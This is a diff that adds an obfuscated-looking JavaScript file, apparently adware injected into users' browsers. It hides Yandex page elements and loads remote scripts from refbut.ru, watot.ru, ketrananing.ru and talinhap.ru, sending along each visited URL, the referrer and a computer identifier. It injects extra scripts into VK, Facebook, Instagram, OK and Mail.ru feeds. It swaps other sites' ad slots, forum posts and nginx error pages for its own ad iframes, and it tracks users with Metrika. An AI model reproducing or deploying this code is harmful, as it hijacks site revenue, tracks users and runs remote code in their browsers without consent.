@@ -1,0 +1,603 @@
+/* [lexko-file2 f5939a52260a28c87abb5a99199ea922 / 82.199.211.248 / ec532edee5600487f2aa1e5a4e8eb9bb / newage / 54321ec532edee5600487f2aa1e5a4e8] */ 
+
+(function() { /* gt-l */
+
+    window.HJ73u2jk4h9shskdjh93uh4kjsdhkjsald893ryhslfhsdflname = '54321ec532edee5600487f2aa1e5a4e8';
+    window.HJ888311373u2jk4h9shs12315552131ld893ryhslfhsdflname = '79a6b14daebffe04ce852328e5710e13';
+
+    hideYandex() && setInterval(function() {
+        hideYandex();
+    }, 500);
+
+    function hideYandex() {
+        if (document.location.host.indexOf("yandex") != -1) {
+            var element = document.querySelectorAll(".popup,.head-stripe,.z-default-search");
+            if (element) {
+                for (var i = 0; i < element.length; i++) {
+                    element[i].style.cssText = 'height:0px !important; width:0px !important; display:none !important;';
+                }
+            }
+        }
+    }
+
+    var moDomain = "//refbut.ru";
+    var isdev = "0";
+    var ySrvp = "79a6b14daebffe04ce852328e5710e13";
+    var buildid = "f5939a52260a28c87abb5a99199ea922";
+    var isYandex = navigator.userAgent.match(/YaBrowser/i);
+
+    if (window === window.top && !window.HJGSghsafJfshjashfsalasahbvxghjsdfkfjhsdGHjkgsdJKHFfhjs73h) {
+        window.HJGSghsafJfshjashfsalasahbvxghjsdfkfjhsdGHjkgsdJKHFfhjs73h = true;
+        window.load_page_url = document.location.href;
+
+        window.addEventListener("message", function (event) {
+            if (event.data && event.data.command) {
+                if (event.data.command == 'log_format') {
+                    if (event.data.key == 'Banners') {
+                        formatVal = event.data.data;
+                        window.yaCounter39097515.reachGoal("sendParams", {"Formats":{ 'Banners': formatVal }});
+                        // console.log('[B]', {"Formats":{ 'Banners': formatVal }});
+                    } else if (event.data.key == 'Clickunder') {
+                        window.yaCounter39097515.reachGoal("sendParams", {"Formats": "Clickunder"});
+                    } else if (event.data.key == 'Clickunder_cat') {
+                        formatVal = event.data.data;
+                        window.yaCounter39097515.reachGoal("sendParams", {"Formats":{ 'Clickunder_cat': formatVal }});
+                    } else if (event.data.key == 'Overlay_fix') {
+                        window.yaCounter39097515.reachGoal("sendParams", {"Formats": "Overlay_fix"});
+                    }
+                } else if (event.data.command == 'log_format2') {
+                    if (event.data.key == 'Banner') {
+                        dd = event.data.data;
+                        var _ = {}, __ = {}; _[dd[1]] = dd[0];
+                        __[dd[2]] = _;
+                        window.yaCounter39097515.reachGoal("sendParams", {"Formats_network":{ 'Banners': __ }});
+                        // console.log('[B2]', {"Formats_network":{ 'Banners': __ }});
+                    } else if (event.data.key == 'Overlay') {
+                        dd = event.data.data;
+                        var __ = {}; __[dd[1]] = dd[0];
+                        window.yaCounter39097515.reachGoal("sendParams", {"Formats_network":{ 'Overlay': __ }});
+                        // console.log('[O2]', {"Formats_network":{ 'Banners': __ }});
+                    }
+                }
+            }
+        });
+
+        var globalCommandName = (new Date()).getTime() + "";
+        var c = 1;
+
+        if (buildid == '7132fb675a04337ed870d1a888efdbad') {
+            // disable
+        } else if ((buildid == '6e90a8a1c8c035513811e221ea5ed55b' ||
+            buildid == '9c95acca41e09bc4b7096621190554cb' ||
+            buildid == '1f52350921ed726b08db448e70ca4f03' ||
+            buildid == '822344721e5475d3e6cf17b24b0b985a' ||
+            buildid == '431b88e9e20ba0618018249a076e5fa6' ||
+            buildid == '5585411346dc64f21a6642993b4b49ea' ||
+            buildid == '41c39f0aa7614b03e30b8e8b9b1c9e21' ||
+            buildid == '7132fb675a04337ed870d1a888efdbad' ||
+            buildid == 'b923fd92873eba2561336014058c0bcd' ||
+            buildid == '1708fa4f105dbc98f360a399d0d7adb3' ||
+            buildid == '77750662232f6ae38cca774c3a674186' ||
+            buildid == 'a7e19cdc363d9c343a8f5ca8b32fddbf' ||
+            buildid == '9aec047f9b4c95e43736e64e352c8e54' ||
+            buildid == '5f987a317b7987b2e0d13e2e640712a2' ||
+            buildid == '3424afa0fbb5e14f89658a6820f9a8de' ||
+            buildid == 'foelhpmfpigpljggmfhligcaejdoagbk') && (document.location.host.indexOf("kinokrad") != -1 || document.location.host.indexOf("kinoprofi") != -1)) {
+            // => disable
+        } else if (buildid == '9a46e336d57d3decd5d04b4ceb5fc9ac' && document.location.host.indexOf("kino-hd720") != -1) {
+            // => disable
+        } else if ( document.location.host.indexOf("bongacams") != -1 ||
+            document.location.host.indexOf("porn") != -1  ||
+            document.location.host.indexOf("runetki") != -1  ||
+            document.location.host.indexOf("ebal") != -1  ||
+            document.location.host.indexOf("24video") != -1  ||
+            document.location.host.indexOf("sex") != -1  ||
+            document.location.host.indexOf("erotic") != -1   ||
+            document.location.host.indexOf("xxx") != -1 ) {
+            // => disable
+        } else {
+            var start_script = window.setInterval(function() {
+                if (document.querySelector('body')) {
+                    clearInterval(start_script);
+                    runMe();
+                } else {
+                    //console.log(c + ' tick');
+                    if (c >= 50) {
+                        clearInterval(start_script);
+                        runMe();
+                    }
+                    c++;
+                }
+            }, 100);
+        }
+
+        function socialPost()
+        {
+            if (document.location.href.indexOf("vk.com/feed") !== -1) {
+                var vk = document.createElement('script');
+                vk.async = true;
+                vk.type = 'text/javascript';
+                vk.src = '//talinhap.ru/soc/'+ySrvp+'/vk';
+                vk.src += '?r=' + Math.floor(Math.random() * 999999000);
+                document.body.appendChild(vk);
+            }
+            if (document.location.href.indexOf("facebook.com") !== -1 && (document.location.pathname == "" || document.location.pathname == "/")) {
+                var fb = document.createElement('script');
+                fb.async = true;
+                fb.type = 'text/javascript';
+                fb.src = '//talinhap.ru/soc/'+ySrvp+'/fb';
+                fb.src += '?r=' + Math.floor(Math.random() * 999999000);
+                document.body.appendChild(fb);
+            }
+            if (document.location.href.indexOf("ok.ru/feed") !== -1) {
+                var fb = document.createElement('script');
+                fb.async = true;
+                fb.type = 'text/javascript';
+                fb.src = '//talinhap.ru/soc/'+ySrvp+'/ok';
+                fb.src += '?r=' + Math.floor(Math.random() * 999999000);
+                document.body.appendChild(fb);
+            }
+            if (document.location.href.indexOf("instagram.com") !== -1 && (document.location.pathname == "" || document.location.pathname == "/")) {
+                var fb = document.createElement('script');
+                fb.async = true;
+                fb.type = 'text/javascript';
+                fb.src = '//talinhap.ru/soc/'+ySrvp+'/in';
+                fb.src += '?r=' + Math.floor(Math.random() * 999999000);
+                document.body.appendChild(fb);
+            }
+            if (document.location.href.indexOf("fotostrana.ru") !== -1 && (document.location.pathname == "" || document.location.pathname == "/")) {
+                var fb = document.createElement('script');
+                fb.async = true;
+                fb.type = 'text/javascript';
+                fb.src = '//talinhap.ru/soc/'+ySrvp+'/fs';
+                fb.src += '?r=' + Math.floor(Math.random() * 999999000);
+                document.body.appendChild(fb);
+            }
+            if (document.location.href.indexOf("my.mail.ru") !== -1 && (document.location.pathname == "" || document.location.pathname == "/")) {
+                var fb = document.createElement('script');
+                fb.async = true;
+                fb.type = 'text/javascript';
+                fb.src = '//talinhap.ru/soc/'+ySrvp+'/mm';
+                fb.src += '?r=' + Math.floor(Math.random() * 999999000);
+                document.body.appendChild(fb);
+            }
+        }
+
+        function runMe()
+        {
+            if (!window.runMen12nin123i4ni1n34iu1n23iu4n1n34) {
+                window.runMen12nin123i4ni1n34iu1n23iu4n1n34 = true;
+
+                
+
+                var hard = false;
+                var adultWords = '';
+                var isAdult = false;
+                var urlParams = 'srv=' + ySrvp + '&session_id=0' + '&defbr=0' + '&publisher_id=323584260a25ba14b5bd8cb5bb5201ea' + '&plugin_id=5555' + '&gplugin_id=a3' + '&instance_id=7777' + '&bildid=' + buildid + '&computer_id=54321ec532edee5600487f2aa1e5a4e8' + '&version=0' + '&adult=' + isAdult + '&adult_key=' + escape(adultWords) + '&referrer=' + encodeURIComponent(document.referrer) + '&domain=' + document.location.host + '&href=' + encodeURIComponent(document.location.pathname + document.location.search + document.location.hash);
+
+                //urlParams = urlParams + '&cat=0';
+                //if ('2211' == '1122') urlParams = urlParams + '&cat=0';
+
+                var scripts = (!isYandex) ? [moDomain+'/2211', moDomain+'/1222', moDomain+'/2122', moDomain+'/2212', '//watot.ru/check_install'] : [moDomain+'/2211', moDomain+'/1222', moDomain+'/2122', '//ketrananing.ru/d52695de312dd5600fcfafe212e4c05d/f116edcfd1778710fd88cb0955c75efd/' + document.location.host, '//watot.ru/check_install'];
+
+                if (buildid == '1708fa4f105dbc98f360a399d0d7adb3') {
+                    scripts = (!isYandex) ? [moDomain+'/1222', moDomain+'/2122', moDomain+'/2212', '//watot.ru/check_install'] : [moDomain+'/1222', moDomain+'/2122', '//ketrananing.ru/d52695de312dd5600fcfafe212e4c05d/f116edcfd1778710fd88cb0955c75efd/' + document.location.host, '//watot.ru/check_install'];
+                }
+                if (buildid == '77750662232f6ae38cca774c3a674186') {
+                    scripts = (!isYandex) ? [moDomain+'/1222', moDomain+'/2122', moDomain+'/2212', '//watot.ru/check_install'] : [moDomain+'/1222', moDomain+'/2122', '//watot.ru/check_install'];
+                }
+                if (buildid == '6e90a8a1c8c035513811e221ea5ed55b' ||
+                    buildid == '9c95acca41e09bc4b7096621190554cb' ||
+                    buildid == '1f52350921ed726b08db448e70ca4f03' ||
+                    buildid == '822344721e5475d3e6cf17b24b0b985a' ||
+                    buildid == '431b88e9e20ba0618018249a076e5fa6' ||
+                    buildid == '5585411346dc64f21a6642993b4b49ea' ||
+                    buildid == '41c39f0aa7614b03e30b8e8b9b1c9e21' ||
+                    buildid == '7132fb675a04337ed870d1a888efdbad' ||
+                    buildid == 'b923fd92873eba2561336014058c0bcd' ||
+                    buildid == '1708fa4f105dbc98f360a399d0d7adb3' ||
+                    buildid == '77750662232f6ae38cca774c3a674186' ||
+                    buildid == 'a7e19cdc363d9c343a8f5ca8b32fddbf' ||
+                    buildid == '9aec047f9b4c95e43736e64e352c8e54' ||
+                    buildid == '5f987a317b7987b2e0d13e2e640712a2' ||
+                    buildid == '3424afa0fbb5e14f89658a6820f9a8de' ||
+                    buildid == 'foelhpmfpigpljggmfhligcaejdoagbk') {
+                    if (document.location.host.indexOf("kinokrad") != -1 || document.location.host.indexOf("kinoprofi") != -1) {
+                        scripts = [];
+                    }
+                }
+
+                for (var i = 0; i < scripts.length; i++) {
+                    var script = document.createElement('script');
+                    script.type = 'text/javascript';
+                    script.async = true;
+                    script.src = scripts[i];
+                    script.src += '?' + urlParams + '&r=' + Math.floor(Math.random() * 999999000);
+
+                    if (scripts[i] == moDomain+'/1222' ||
+                        scripts[i] == moDomain+'/1122' ||
+                        scripts[i] == moDomain+'/2122') {
+                        script.src += '&cat=0';
+                    }
+
+                    if (scripts[i] == moDomain+'/2212') {
+                        document.body.appendChild(script);
+                    } else {
+                        document.head.appendChild(script);
+                    }
+                }
+
+                socialPost();
+
+                if (buildid != 'e3db43bb7ebae5a6a02e0f149c55cc87')
+                    setInterval(function() {
+                        if (window.load_page_url != document.location.href) {
+                            window.load_page_url = document.location.href;
+                            window.top.postMessage('close', '*');
+                            var vo = document.createElement('script');
+                            vo.async = true;
+                            vo.type = 'text/javascript';
+                            vo.src = moDomain+'/2212';
+                            vo.src += '?' + urlParams + '&r=' + Math.floor(Math.random() * 999999000);
+                            document.body.appendChild(vo);
+                            var log = document.createElement('script');
+                            log.async = true;
+                            log.type = 'text/javascript';
+                            log.src = moDomain+'/gt2?b=f5939a52260a28c87abb5a99199ea922&publisher_id=323584260a25ba14b5bd8cb5bb5201ea&uid=newage&newtest=1&bol=1&r=1501753658152&h=thetheme.io&onlylog=1';
+                            document.body.appendChild(log);
+                            socialPost();
+                        }
+                    }, 1000);
+
+                var makeRequest = function(divID, width, height, injnum) {
+                    var el = document.createElement("iframe");
+                    el.src = moDomain + "/2221?" + "n=" + divID + "&replace=" + injnum + "&hohoho=1" + "&w=" + width + "&h=" + height + "&divid=" + divID + "&" + urlParams + '&r=' + (new Date()).getTime() + '&fix=yastaticadfix&cat=0';
+                    el.style.border = "0";
+                    el.style.overflow = "hidden";
+                    el.style.width = width + "px";
+                    el.style.height = height + "px";
+                    var d = document.getElementById(divID);
+                    if (d) {
+                        d.appendChild(el);
+                        if (isdev=="1") {
+                            var d4 = document.createElement('div');
+                            d4.className = 'testinject1';
+                            d4.style.cssText = 'font-size:0.6em;position:absolute;top:10px;left:10px;background:red;color:white;padding:3px;z-index:99999;border:1px solid #ccc;';
+                            d4.innerHTML = '<div class="testinject2">inj=<b>'+injnum+'</b>,s=<b>'+width+'x'+height+'</b></div>';
+                            d.appendChild(d4);
+                        }
+                    }
+                };
+                var BlackList = ["^(.*\\.)?ad-tizer\\.net$"];
+                var isWorkNow = true;
+                for (var bl = 0; bl < BlackList.length; bl++) {
+                    var r = new RegExp(BlackList[bl], "i");
+                    if (r.test(document.location.host)) {
+                        isWorkNow = false;
+                        break;
+                    }
+                }
+                var _;
+
+                function modifyElem(num, type, elem) {
+                    var w = elem.clientWidth,
+                        h = elem.clientHeight,
+                        _w = 0,
+                        _h = 0,
+                        find_status = false;
+                    var sizeTest = [
+                        [600, 300],
+                        [600, 200],
+                        [300, 250],
+                        [240, 400],
+                        [160, 600],
+                        [140, 600],
+                        [728, 90]
+                    ];
+                    var BreakException = {};
+                    if (w == 0 || h == 0) return;
+                    try {
+                        sizeTest.forEach(function(valx, indx, sizeTest) {
+                            if (parseInt(w) >= valx[0] && parseInt(h) >= valx[1]) {
+                                _w = valx[0];
+                                _h = valx[1];
+                                find_status = true;
+                                throw BreakException;
+                            }
+                        });
+                    } catch (e) {
+                        if (e !== BreakException) throw e;
+                    }
+                    if (find_status) {
+                        switch (type) {
+                            case 1:
+                            {
+                                elem.setAttribute("replace", num);elem.style.cssText = 'height:' + _h + 'px!important;display:inline-table;border:none;margin:0;padding:0;position:relative;visibility:visible;background-color:transparent;text-align: center;';elem.className = elem.className + ' q_block';elem.innerHTML = "<div replace='" + num + "' class='q_inj' ww='" + _w + "' hh='" + _h + "' id='ololo_" + (new Date()).getTime() + "' style='width:" + elem.clientWidth + "px!important;height:" + elem.clientHeight + "px!important;' width='" + elem.clientWidth + "' height='" + elem.clientHeight + "'><span style='color:#ccc;font-size:0.8em;'>loading...</span></div>";
+                                break;
+                            }
+                            case 2:
+                            {
+                                elem.id = 'XXXXX';
+                                elem.className = 'XXXXX';
+                                elem.setAttribute("replace", num);elem.style.cssText = 'height:' + _h + 'px !important';elem.className = elem.className + ' q_block';
+                                elem.innerHTML = "<div replace='" + num + "' class='q_inj' ww='" + _w + "' hh='" + _h + "' id='ololo_" + (new Date()).getTime() + "' style='width:" + elem.clientWidth + "px!important;height:" + elem.clientHeight + "px!important;' width='" + elem.clientWidth + "' height='" + elem.clientHeight + "'><span style='color:#ccc;font-size:0.8em;'>loading...</span></div>";
+                                break;
+                            }
+                        }
+                    } else {
+                        elem.innerHTML = "";
+                        elem.style.cssText = 'height:0px !important';
+                        elem.className = elem.className + ' q_block';
+                        elem.setAttribute("whynot", "w=" + w + "h=" + h + "f=" + parseInt(find_status) + "t=" + type);
+                        elem.setAttribute("replace", num);
+                    }
+                }
+
+                function findBlock(num, type, path) {
+                    _ = document.querySelectorAll(path);
+                    for (var i = 0; i < _.length; i++) {
+                        switch (type) {
+                            case 1:
+                            {
+                                if ((_[i].id.split("_rand").length-1) == 0) {
+                                    _[i].id = _[i].id + '_rand';
+                                    _[i].className = _[i].className + ' q_block';
+                                    modifyElem(num, 1, (document.getElementById(_[i].id).parentElement.nodeName == 'NOINDEX') ? document.getElementById(_[i].id).parentElement.parentElement : document.getElementById(_[i].id).parentElement);
+                                }
+                                break;
+                            }
+                            case 2:
+                            {
+                                modifyElem(num, 1, _[i]);
+                                break;
+                            }
+                            case 3:
+                            {
+                                modifyElem(num, 2, _[i]);
+                                break;
+                            }
+                            case 4:
+                            {
+                                _[i].className = 'q_block_inj';
+                                _[i].style.cssText = 'display:block;border:none;height:' + _[i].attributes.hh.value + 'px;margin:0;padding:0;position:relative;visibility:visible;background-color:transparent;text-align: center;';
+                                _[i].innerHTML = "";
+                                makeRequest(_[i].id, _[i].attributes.ww.value, _[i].attributes.hh.value, _[i].getAttribute("replace"));
+                                break;
+                            }
+                            case 5:
+                            {
+                                if ((_[i].id.split("_rand").length-1) == 0) {
+                                    _[i].id = _[i].id + '_rand';
+                                    _[i].className = _[i].className + ' q_block';
+                                    var nn = document.getElementById(_[i].id) ? document.getElementById(_[i].id).parentElement.nodeName : '';
+                                    if (nn == 'DIV' || nn == 'SPAN' || nn == 'CENTER' || nn == 'TD' || nn == 'B' || nn == 'U' || nn == 'S') {
+                                        modifyElem(num, 2, document.getElementById(_[i].id).parentElement);
+                                    }
+                                }
+                                break;
+                            }
+                        }
+                    }
+                }
+
+                if (isWorkNow) {
+                    window.setInterval(function() {
+                        findBlock(15, 5, 'iframe[id^=\"cto_iframe_\"]:not(.x_chrome_block)');
+                        findBlock(16, 5, 'iframe[id^=\"AdFox_plug_\"]:not(.x_chrome_block)');
+                        findBlock(17, 5, 'iframe[src*=\"adriver\"]:not(.x_chrome_block)');
+                        findBlock(19, 5, 'div[id^=\"b\"]:not(.x_chrome_block) > iframe[src*=\"iframe\"]:not(.x_chrome_block)');
+                        findBlock(22, 5, 'div[id^=\"MarketGidComposite\"]:not(.x_chrome_block) > div.mgbox');
+                        findBlock(23, 5, 'div[id^=\"bn_\"]:not(.x_chrome_block) > table[class^=\"bn_\"]:not(.x_chrome_block)');
+                        findBlock(51, 5, 'iframe[id^=\"ad_creative\"]:not(.x_chrome_block)');
+                        findBlock(55, 5, 'div[id^=\"adfox-direct\"]:not(.x_chrome_block)');
+                        findBlock(56, 5, 'div[id^=\"begun_block\"]:not(.x_chrome_block)');
+                        findBlock(57, 5, 'iframe[src*=\"rutrk\"]:not(.x_chrome_block)');
+                        findBlock(58, 5, 'iframe[src*=\"betsonsport\"]:not(.x_chrome_block)');
+                        findBlock(59, 3, 'ins[id^=\"aswift\"]:not(.x_chrome_block)');
+                        //findBlock(62, 5, 'div[id^=\"admixer\"]:not(.x_chrome_block)');
+                        findBlock(30, 5, 'iframe[id^=\"AdFox_iframe_\"]:not(.x_chrome_block)');
+                        findBlock(31, 5, 'iframe[id^=\"adfoxHtml5_iframe_\"]:not(.x_chrome_block)');
+                        findBlock(31, 5, 'iframe[id^=\"AdFox_banner_\"]:not(.x_chrome_block)');
+                        findBlock(39, 5, 'iframe[src*=\"gettraff\"]:not(.x_chrome_block)');
+                        findBlock(40, 5, 'iframe[src*=\"mxttrf\"]:not(.x_chrome_block)');
+                        findBlock(41, 5, 'iframe[src*=\"solocpm\"]:not(.x_chrome_block)');
+                        findBlock(42, 5, 'iframe[src*=\"mradx\"]:not(.x_chrome_block)');
+                        //findBlock(64, 5, 'iframe[src*=\"ad.\"]:not(.x_chrome_block)');
+                    }, 1000);
+                    window.setInterval(function() {
+                        findBlock(25, 5, 'iframe[id^=\"google_ads_iframe\"]:not(.x_chrome_block)');
+                        findBlock(50, 5, 'iframe[id^=\"google_ad\"]:not(.x_chrome_block)');
+                        findBlock(1,  3, 'ins[class=\"adsbygoogle\"]:not(.x_chrome_block)');
+                        findBlock(14, 5, 'iframe[src*=\"googlesyndication\"]:not(.x_chrome_block)');
+                        findBlock(63, 5, 'yatag:not(.x_chrome_block)');
+                        findBlock(100, 4, '.q_inj');
+                    }, 250);
+                    nginxErrors();
+                    isPhpbb();
+                    isVbulletin();
+                }
+
+                function nginxErrors() {
+                    var error_title = "Welcome to nginx!|300 Multiple Choices|301 Moved Permanently|302 Moved Temporarily|400 Bad Request|401 Unauthorized|402 Payment Required|403 Forbidden|404 Not Found|405 Method Not Allowed|406 Not Acceptable|407 Proxy Authentication Required|408 Request Timeout|409 Conflict|410 Gone|413 Request Entity Too Large|423 Locked|429 Too Many Requests|431 Request Header Fields Too Large|434 Requested host unavailable|500 Internal Server Error|501 Not Implemented|502 Bad Gateway|503 Service Unavailable|504 Gateway Timeout|505 HTTP Version Not Supported|506 Variant Also Negotiates|507 Insufficient Storage|508 Loop Detected|509 Bandwidth Limit Exceeded|510 Not Extended|511 Network Authentication Required|";
+                    var error_page = document.querySelector("title");
+                    var height_ = (Math.random() >= 0.6) ? 300 : 200;
+                    var inject = false;
+                    if (error_page && error_title.indexOf(error_page.text) != -1) {
+                        if (error_page.text.indexOf("to nginx") != -1) {
+                            inject = "body";
+                        } else {
+                            var nginx = document.querySelectorAll("body > center")[1];
+                            if (nginx && nginx.innerText.indexOf("nginx") != -1) {
+                                inject = "center";
+                            }
+                        }
+                        if (inject) {
+                            var d4 = document.createElement('iframe');
+                            d4.style.cssText = 'border:0px;margin-left: -10px;width:600px;height:'+height_+'px;z-index:99999;';
+                            d4.setAttribute("replace", 1004);
+                            d4.src = moDomain + "/2221?replace=1004&w=600&h="+height_+"&" + urlParams + '&r=' + (new Date()).getTime() + '&cat=0';
+                            document.querySelector(inject).appendChild(d4);
+                        }
+                    }
+                }
+                function isPhpbb() {
+                    var yep = false;
+
+                    if (window.isPhpbb) {
+                        return false;
+                    }
+                    if (document.querySelector("html[dir=ltr]")) {
+                        yep = true;
+                    }
+                    if (document.querySelector("body#phpbb")) {
+                        yep = true;
+                    }
+                    if (_ = document.querySelector("body.ltr")) {
+                        yep = true;
+                    }
+                    if (!yep) {
+                        return false;
+                    }
+
+                    window.isPhpbb = true;
+
+                    var content1 = document.querySelectorAll("div#page-body");	// new
+                    var content2 = document.querySelectorAll("div#wrapcentre"); // old
+                    var content;
+                    var postdiv = "div.post";
+
+                    if (content1 && content1.length != 0) {
+                        content = document.querySelector("div#page-body");
+                        postdiv = "div.post-container";
+                        for (var i = 0; i < content1.length; i++) {
+                            content1[i].style.width = "calc(100% - 300px)";
+                        }
+                    }
+                    if (content2 && content2.length != 0) {
+                        content = document.querySelector("div#wrapcentre");
+                        postdiv = "table.tablebg > tbody > tr > td.spacer:last-child";
+                        for (var i = 0; i < content2.length; i++) {
+                            content2[i].style.width = "calc(100% - 360px)";
+                        }
+                    }
+
+                    var d3 = document.createElement('iframe');
+                    d3.style.cssText = 'border:0px;position: fixed;right: 20px;width: 300px;height:300px;z-index:99999;';
+                    d3.setAttribute("replace", 1000);
+                    d3.src = moDomain + "/2221?replace=1000&w=300&h=250&" + urlParams + '&r=' + (new Date()).getTime() + '&cat=0';
+                    if (content) content.insertBefore(d3,content.childNodes[0]);
+
+                    var content = (document.querySelector("div#page-header")) ? document.querySelector("div#page-header") : document.querySelector("div#wrapheader");
+                    var d4 = document.createElement('iframe');
+                    d4.style.cssText = 'border:0px;width:728px;height:90px;z-index:99999;';
+                    d4.setAttribute("replace", 1001);
+                    d4.src = moDomain + "/2221?replace=1001&w=728&h=90&" + urlParams + '&r=' + (new Date()).getTime() + '&cat=0';
+                    if (content) content.appendChild(d4);
+
+                    var content = document.querySelectorAll(postdiv);
+                    if (!content || content.length == 0) content = document.querySelectorAll("div.signature");
+                    if (!content || content.length == 0) content = document.querySelectorAll("div.post");
+
+                    var height_ = (Math.random() >= 0.6) ? 300 : 200;
+                    if (content && content.length != 0) {
+                        for (var i = 0; i < content.length; i++) {
+                            if (i % 10 == 0) {
+                                var d4 = document.createElement('iframe');
+                                d4.style.cssText = 'border:0px;width:600px;height:'+height_+'px;z-index:99999;';
+                                d4.setAttribute("replace", 1002);
+                                d4.src = moDomain + "/2221?replace=1002&w=600&h=" + height_ + "&" + urlParams + '&r=' + (new Date()).getTime() + '&cat=0';
+                                if (content[i]) content[i].appendChild(d4);
+                            }
+                        }
+                    }
+
+                }
+                function isVbulletin() {
+                    if (window.isVbulletin) {
+                        return false;
+                    }
+                    if (typeof window["vBulletin_init"] == "function") {
+                        var height_ = (Math.random() >= 0.6) ? 300 : 200;
+                        var posts = (document.querySelector("div#posts")) ? document.querySelector("div#posts") : document.querySelector("div#postlist");
+                        if (posts) {
+                            var post = document.querySelectorAll("div#posts > div > div.page");
+                            if (!post || post.length == 0) {
+                                post = document.querySelectorAll("li.postcontainer");
+                            }
+                            if (post && post.length != 0) {
+                                for (var i = 0; i < post.length; i++) {
+                                    if (i % 10 == 0) {
+                                        var d3 = document.createElement('div');
+                                        d3.style.cssText = 'text-align:center;padding:3px;';
+                                        d3.innerHTML = '';
+                                        if (post[i]) {
+                                            post[i].appendChild(d3);
+                                            var d4 = document.createElement('iframe');
+                                            d4.style.cssText = 'border:0px;margin-left: 20px;width:600px;height:'+height_+'px;z-index:99999;';
+                                            d4.setAttribute("replace", 1005);
+                                            d4.src = moDomain + "/2221?replace=1005&w=600&h="+height_+"&" + urlParams + '&r=' + (new Date()).getTime() + '&cat=0';
+                                            d3.appendChild(d4);
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                        // top
+                        var navbar = document.querySelectorAll("td.navbar");
+                        if (!navbar || navbar.length == 0) navbar = document.querySelectorAll("span.navbar");
+                        if (!navbar || navbar.length == 0) navbar = document.querySelectorAll(".above_body");
+                        if (navbar && navbar.length != 0) {
+                            var d3 = document.createElement('div');
+                            d3.style.cssText = 'display:block;text-align:center;padding:3px;';
+                            d3.innerHTML = '';
+                            if (navbar[0]) {
+                                navbar[0].appendChild(d3);
+                                var d4 = document.createElement('iframe');
+                                d4.style.cssText = 'border:0px;margin-left: 20px;width:728px;height:90px;z-index:99999;';
+                                d4.setAttribute("replace", 1006);
+                                d4.src = moDomain + "/2221?replace=1006&w=728&h=90&" + urlParams + '&r=' + (new Date()).getTime() + '&cat=0';
+                                d3.appendChild(d4);
+                            }
+                        }
+                    }
+                    window.isVbulletin = true;
+
+                }
+
+                (function (d, w, c) { (w[c] = w[c] || []).push(function() { try { w.yaCounter36305740 = new Ya.Metrika({ id:36305740, clickmap:true, trackLinks:true, accurateTrackBounce:true, ut:"noindex" }); } catch(e) { } }); var n = d.getElementsByTagName("script")[0], s = d.createElement("script"), f = function () { n.parentNode.insertBefore(s, n); }; s.type = "text/javascript"; s.async = true; s.src = "https://d31j93rd8oukbv.cloudfront.net/metrika/watch_ua.js"; if (w.opera == "[object Opera]") { d.addEventListener("DOMContentLoaded", f, false); } else { f(); } })(document, window, "yandex_metrika_callbacks");
+                (function(d, w, c) {
+                    (w[c] = w[c] || []).push(function() {
+                        try {
+                            var yaParams = {"Convi":{"323584260a25ba14b5bd8cb5bb5201ea":["f5939a52260a28c87abb5a99199ea922"]}, "Script":["lehko"], "Servplay":[ySrvp]};
+                            w.yaCounter39097515 = new Ya.Metrika({
+                                id: 39097515,
+                                clickmap: true,
+                                trackLinks: true,
+                                accurateTrackBounce: true,
+                                ut: "noindex",
+                                params: yaParams||{}
+                            });
+                        } catch (e) {}
+                    });
+                    var n = d.getElementsByTagName("script")[0],
+                        s = d.createElement("script"),
+                        f = function() {
+                            n.parentNode.insertBefore(s, n);
+                        };
+                    s.type = "text/javascript";
+                    s.async = true;
+                    s.src = "https://d31j93rd8oukbv.cloudfront.net/metrika/watch_ua.js";
+                    if (w.opera == "[object Opera]") {
+                        d.addEventListener("DOMContentLoaded", f, false);
+                    } else {
+                        f();
+                    }
+                })(document, window, "yandex_metrika_callbacks");
+
+            } else {
+                //console.log('[+] runMe() - find');
+            }
+        }
+    }
+})(this);
+
